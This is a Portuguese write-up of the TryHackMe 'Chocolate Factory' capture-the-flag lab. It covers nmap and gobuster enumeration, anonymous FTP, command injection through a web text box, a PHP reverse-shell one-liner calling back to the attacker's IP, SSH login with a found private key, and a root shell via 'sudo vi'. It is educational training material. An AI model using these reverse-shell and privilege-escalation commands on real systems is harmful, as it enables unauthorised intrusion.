# Chocolate Factory Writeup

> [!NOTE] 
> **[EN]** This version of the writeup is in portuguese. Click [here]() or follow [this link (github)]() to go to the english version.

> **Link para o desafio CTF**: [https://tryhackme.com/room/chocolatefactory](https://tryhackme.com/room/chocolatefactory)
> **Dificuldade:** `Fácil`
> **Data de Resolução:** `2026/04/17`
## Sumário

> Link do writeup no github: [https://github.com/Luke0133/offsec-ctf/blob/main/CTFs/Chocolate%20Factory/(PT-BR)%20ChocolateFactory%20Writeup.md](https://github.com/Luke0133/offsec-ctf/blob/main/CTFs/Chocolate%20Factory/(PT-BR)%20ChocolateFactory%20Writeup.md)

- [Ferramentas Utilizadas](#ferramentas%20utilizadas)
- [Resolução do CTF](#Resolução%20do%20CTF)
	1. [Reconhecimento](#Reconhecimento)
	2. [Exploração](#Exploração)
	3. [Escalação de Privilégios](#Escalação%20de%20Privilégios)
- [Conclusão](#Conclusão)
- [Referências](#Referências)

## Ferramentas Utilizadas

Para este CTF, foram utilizadas as seguintes ferramentas:
- [Nmap](https://nmap.org/)[^nmap]: ferramenta de exploração da internet, criada para escanear rapidamente redes de larga escala. O Nmap realiza diversas requisições para um IP para determinar quais hosts estão disponíveis naquela rede, quais serviços que eles oferecem (por exemplo, HTTP, ssh, ...), quais sistemas operacionais (e versões destes) estão utilizando dentre outras informações. Sendo uma ferramenta poderosa para a enumeração de serviços e fornecimento de informações básicas sobre os hosts de uma rede, dados essenciais para alguém que está tentando invadir um sistema, o Nmap é muito utilizado em situações de pentesting e geralmente faz parte do primeiro passo nos CTFs.
- [Gobuster](https://github.com/OJ/gobuster)[^gobuster]: ferramenta responsável por enumerar por força bruta diretórios e arquivos, detectar subdomínios DNS e hosts virtuais, dentre outras funções. Por ser de alta performance, o Gobuster é essencial para agilizar o processo de encontrar diretórios de sistemas, poupando o desgaste da pessoa invasora de procurá-los manualmente, sendo, portanto recomendado para CTFs e pentesting.
- [Netcat](http://www.stearns.org/nc/)[^netcat]: programa basico de Unix responsável por ler e escrever dados através de conexões de rede. Em um contexto de pentesting, o netcat é uma ótima ferramenta para criar conexões com os sistemas na rede e ter acesso a eles de forma remota, permitindo técnicas como a de reverse shell, muito importante também nos contextos de CTF.

Bem como recursos como:
- [Reverse Shell Generator (revshells)](https://www.revshells.com/)[^revshellgen]: site contendo códigos e comandos para gerar shells reversas de diversas maneiras, sendo então flexível para cada situação
- [GTFOBins](https://gtfobins.org/)[^gtfo]:  lista de executáveis estilo Unix que permitem ultrapassar restrições de segurança em sistemas vulneráveis, muito útil para realizar escalação de privilégio. Assim como o site anterior, contém um compilado de funções para várias situações.


## Resolução do CTF

O CTF Chocolate Factory, disponível no TryHackMe, é um desafio de dificuldade fácil que requer a exploração de um sistema para achar a flag de usuário e de root. Neste CTF foram exploradas vulnerabilidades em um servidor web, como caixas de texto que permitiram o acesso por reverse shell, o uso de chaves privadas para o acesso de usuário por meio de ssh e escalação de privilégios por meio de permissões totais de super user para um tipo de programa. 

Após conectar-me ao VPN do TryHackMe, obtive acesso à maquina e iniciei o desafio. A estratégia usada foi dividida em duas partes:

1. [Reconhecimento](#Reconhecimento)
2. [Exploração](#Exploração)
3. [Escalação de Privilégios](#Escalação%20de%20Privilégios)

Para facilitar a entrada de argumentos, adicionei ao `etc/hosts` uma relação entre o IP da máquina vulnerável com um nome de domínio (`vul.net`). Com tudo preparado, comecei o reconhecimento

### Reconhecimento

A primeira coisa que fiz para o reconhecimento da máquina-alvo foi uma enumeração da rede com o nmap[^nmap], executando:

```sh 
nmap -T4 -A vul.net
```

em que `-T4` representa o template de temporização (de 0 a 5, quanto maior, mais rápido, ou seja, mais interações e menos discrição, o que não costuma ser um problema em CTFs básicos) e `-A` habilita a detecção de SO, detecção de versão, traceroute e scan de scripts. Demorou um pouco, algo que percebi quando o resultado final me forneceu muitas linhas. Dados relevantes da enumeração estão a seguir:

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-17 13:13 EDT
Nmap scan report for vul.net (<TARGET_IP>)
Host is up (0.15s latency).
Not shown: 989 closed tcp ports (reset)
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 3.0.5
22/tcp  open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.4.41 ((Ubuntu))
100/tcp open  newacct?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
106/tcp open  pop3pw?
#[...] Mesmo resultado que na porta 100
109/tcp open  pop2?
#[...] Mesmo resultado que na porta 100
110/tcp open  pop3?
#[...] Mesmo resultado que na porta 100
111/tcp open  rpcbind?
#[...] Mesmo resultado que na porta 100
113/tcp open  ident?
| fingerprint-strings: 
|   GenericLines, Help, LDAPSearchReq, NULL, RPCCheck, SSLSessionReq: 
|_    http://localhost/key_rev_key <- You will find the key here!!!
119/tcp open  nntp?
#[...] Mesmo resultado que na porta 100
125/tcp open  locus-map?
#[...] Mesmo resultado que na porta 100
#[...]
```

em que percebi que o sistema era baseado em Apache, e muitas portas estavam abertas. Inspecionando melhor o resultado, descartei as portas 106, 109, 110, 111, 119 e 125 por explicitamente dizerem que eu não encontraria nada nelas. As portas 21, 22 e 80 eram promissoras (ftp, ssh e http) e, como o serviço http estava disponível, decidi já executar um comando no gobuster[^gobuster], para adiantar a enumeração de diretórios:

```sh
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://vul.net/ -x php,html,txt -t 50
```

Este comando busca os diretórios com a wordlist fornecida (`-w`, com uma wordlist média contendo uma lista de diretórios mais comuns), no url fornecido (`-u`) e com as extensões fornecidas (`-x`, em que coloquei as mais comuns como php, html e txt), na quantidade de threads fornecida (`-t`, e, mais uma vez, discrição não é essencial nesse CTF, então o número escolhido foi alto para agilizar o processo). O resultado final obtido foi o seguinte:

```sh
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://vul.net/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 272]
/.html                (Status: 403) [Size: 272]
/home.php             (Status: 200) [Size: 569]
/index.html           (Status: 200) [Size: 1466]
/validate.php         (Status: 200) [Size: 93]
/.html                (Status: 403) [Size: 272]
/.php                 (Status: 403) [Size: 272]
/server-status        (Status: 403) [Size: 272]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Os resultados finais dessa enumeração serão discutidos durante a fase de exploração, pois comecei a exploração ao mesmo tempo que executei o gobuster (tanto que nem comecei explorando o http). Vale notar outra porta com uma mensagem interessante, a porta 113:

> ```
> 113/tcp open  ident?
| fingerprint-strings: 
|   GenericLines, Help, LDAPSearchReq, NULL, RPCCheck, SSLSessionReq: 
|_    http://localhost/key_rev_key <- You will find the key here!!!
> ```

Algo de interessante pode estar por ali também.
### Exploração

Antes de qualquer coisa, decidi entender melhor o que era o texto presente na porta 113. Ao entrar em `http://vul.net/key_rev_key`, o arquivo `key_rev_key` foi baixado em minha máquina. O arquivo aparentava ser um binário, mas eu não tinha como executá-lo (falta de permissões). Ao invés de tentar alterar as permissões do arquivo, decidi antes ver o seu conteúdo:

```bash
$ strings key_rev_key

/lib64/ld-linux-x86-64.so.2
libc.so.6
#[...]
Enter your name: 
laksdhfas
 congratulations you have found the key:   
b'<KEY_1>'
 Keep its safe
Bad name!
#[...]
```

Mesmo se eu conseguisse executar o programa, ele iria pedir por um nome e uma senha, os quais eu não teria acesso, mas desse jeito obtive uma chave (`<KEY_1>`), que pode ser útil posteriormente.

Após isso, continuei exploração pelo serviço do ftp[^ftp]. Como em alguns casos é possível entrar com um usuário anônimo, sem a necessidade de senhas, decidi testar para essa máquina e, realmente, consegui acesso anônimo:

```bash
$ ftp vul.net         
Connected to vul.net.
220 (vsFTPd 3.0.5)
Name (vul.net:kali): anonymous
331 Please specify the password.
Password: # Apenas ENTER, não há senha
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||51446|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
226 Directory send OK.
ftp> get gum_room.jpg
#[...]
```

Infelizmente, havia apenas uma imagem, e um simples `string` não revelou nada a mais. Não quis perder muito tempo pesquisando outras técnicas para extrair informação de imagens, então decidi deixar de lado e voltar caso necessário (não foi necessário).

Com isso, fui para a página inicial do site http, com a seguinte tela:

![pagina inicial](assets_chf/chf_index.png)

O código fonte da página não continha informações relevantes. Tentei usar o usuário e a chave `<KEY_1>` para entrar, pois eram a única informação que eu tinha, mas sem sucesso. Porém, descobri que, ao tentar logar, o site redirecionava para `validate.php` (chequei o código html e nada achei também):

![validate.php](assets_chf/chf_validate.png)

Nesse momento, porém, vi o resultado do gobuster[^gobuster] e encontrei um diretório `home.php`:

![home.php](assets_chf/chf_home.png)

Uma caixa de texto. Tentei enviar um `whoami` e tive o retorno `www-data`, ou seja, eu sabia que essa caixa de texto poderia receber comandos. Testei ver a versão de um shell (com `bahs -v` e `sh -v`), mas não tive retorno. Porém, ao enviar `php -v` obtive informações sobre a versão de php, ou seja, talvez seria possível fazer uma shell reversa[^reverseshell] com a execução de um comando em php:

![php](assets_chf/chf_php.png)

Com isso abri uma escuta com o netcat[^netcat]:

```bash 
netcat -lnvp 1234 
```

contendo os seguintes argumentos argumentos:
- `-l`: modo de escuta, justamente para receber as informações do terminal do outro sistema
-  `-n`: desativar o DNS, uma vez que já temos o IP direto, não é necessário ficar resolvendo nomes, deixando o netcat mais rápido
-  `-v`: modo verboso, para ter mais informações, no caso de problemas, por exemplo
-  `-p`: indica a porta de escuta, no caso `1234`

E acessei o site revshells.com[^revshellgen], executando o seguinte comando na caixa presente em `home.php`:

```sh
php -r '$sock=fsockopen("<MY_IP>",1234);exec("sh <&3 >&3 2>&3");'
```

Assim, tive acesso ao usuário `www-data` por meu terminal, facilitando a navegação. Além disso, ao listar o conteúdo na pasta `var/www/html`, encontrei o seguinte:

```bash
$ whoami
www-data
$ ls
home.jpg
home.php
image.png
index.html
index.php.bak
key_rev_key
validate.php
$ cat validate.php
<?php
        $uname=$_POST['uname'];
        $password=$_POST['password'];
        if($uname=="charlie" && $password=="<PASSWORD_1>"){
                echo "<script>window.location='home.php'</script>";
        }
        else{
                echo "<script>alert('Incorrect Credentials');</script>";
                echo "<script>window.location='index.html'</script>";
        }
?>
```

Não só o arquivo `key_rev_key` estava lá (então eu poderia ter descoberto `<KEY_1>` aqui), mas também a página de validação que me deparei anteriormente continha uma senha (<PASSWORD_1>).

Continuei explorando os arquivos até achar a pasta de usuário "charlie" (em `home/charlie`). Ao listar os seus conteúdos, havia vários arquivos, dentre eles a flag de usuário, porém eu não tinha permissões para abrir esse arquivo:

```bash
$ cd charlie
$ ls
teleport
teleport.pub
user.txt
$ cat user.txt
cat: user.txt: Permission denied
```

Apesar disso, vi que havia dois outros arquivos: `teleport` e `teleport.pub`, o que parecia ser um conjunto de chaves. Dado que, pela extensão que ele tinha, `teleport.pub` deveria ser a chave pública, tentei ler o que tinha em `teleport` e, realmente, era uma chave privada RSA:

```
$ cat teleport
-----BEGIN RSA PRIVATE KEY-----
#[...]
-----END RSA PRIVATE KEY-----
```

Com isso, copiei os dados da chave em um arquivo local `rsa_key`, mudei as permissões dele para apenas o usuário dono poderia abrir com `chmod 600 rsa_key`, algo necessário para uma autenticação por ssh, e executei a conexão bem sucedida com a chave privada para o usuário charlie. A partir disso, consegui entrar novamente na pasta `home/charlie` e descobrir a `<USER_FLAG>` escondida em `user.txt`:

```bash
$ ssh charlie@vul.net -i rsa_key
#[...]
charlie@ip-<TARGET_IP>:/$ cd home
charlie@ip-<TARGET_IP>:/home$ cd charlie
charlie@ip-<TARGET_IP>:/home/charlie$ cat user.txt
<USER_FLAG>
```

### Escalação de Privilégios

Por fim, era necessário escalar privilégios e encontrar a flag em `/root`. Para isso, testei no terminal as permissões do usuário:

```
$ charlie@ip-10-64-177-85:/home/charlie$ sudo -l
Matching Defaults entries for charlie on ip-10-64-177-85:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on ip-10-64-177-85:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

Com isso, descobri que o usuário "charlie" tinha acesso privilegiado caso executasse o comando `vi`, um editor de texto de terminal. Dessa forma, eu pude executar o seguinte comando na shell, fornecido pelo site GTFObins[^gtfo]:

```
$ charlie@ip-<TARGET_IP>:/home/charlie$ sudo vi -c ':!/bin/sh' /dev/null
# whoami
# root
```

Ao listar os conteúdos de root, vi que a flag estava em um programa em python, `root.py`. Executando o programa, pediram uma chave, testei com `<KEY_1>` e, assim, encontrei a flag de root, `<ROOT_FLAG>`:

```
# cd /root
# ls
root.py  snap
# python root.py
Enter the key:  <KEY_1>

__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                                                             
  ___                              ___   __  
 / _ \__      ___ __   ___ _ __   / _ \ / _| 
| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
 \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
                                             

  ____ _                     _       _       
 / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
| |___| | | | (_) | (_| (_) | | (_| | ||  __/
 \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
                                             
 _____          _                    
|  ___|_ _  ___| |_ ___  _ __ _   _  
| |_ / _` |/ __| __/ _ \| '__| | | | 
|  _| (_| | (__| || (_) | |  | |_| | 
|_|  \__,_|\___|\__\___/|_|   \__, | 
                              |___/  

<ROOT_FLAG>
```

e finalizei o CTF.
## Conclusão

O CTF Chocolate Factory permitiu explorar a vulnerabilidade de uma caixa de texto que permitia a execução de comandos, bem como o uso de uma chave privada para acessar a conta de um usuário por meio de ssh. A exploração de diretórios enumerados no sistema web também foi essencial para encontrar essas vulnerabilidades e permitir o acesso inicial por meio de uma reverse shell e a escalação de privilégios seguiu a mesma ideia de ctfs anteriores, que era encontrar alguma permissão de super user que pudesse ser explorada.
## Referências

[^nmap]: Nmap: [https://nmap.org/](https://nmap.org/)
[^gobuster]: Gobuster: [https://github.com/OJ/gobuster](https://github.com/OJ/gobuster)
[^netcat]: Netcat: [http://www.stearns.org/nc/](http://www.stearns.org/nc/)
[^gtfo]: GTFOBins: [https://gtfobins.org/](https://gtfobins.org/)
[^revshellgen]: Reverse Shell Generator (revshells): [https://www.revshells.com/](https://www.revshells.com/)
[^ftp]: Sobre FTP: [https://en.wikipedia.org/wiki/File_Transfer_Protocol](https://en.wikipedia.org/wiki/File_Transfer_Protocol)
[^reverseshell]: Sobre reverse shells: [https://en.wikipedia.org/wiki/Shell_shoveling](https://en.wikipedia.org/wiki/Shell_shoveling)
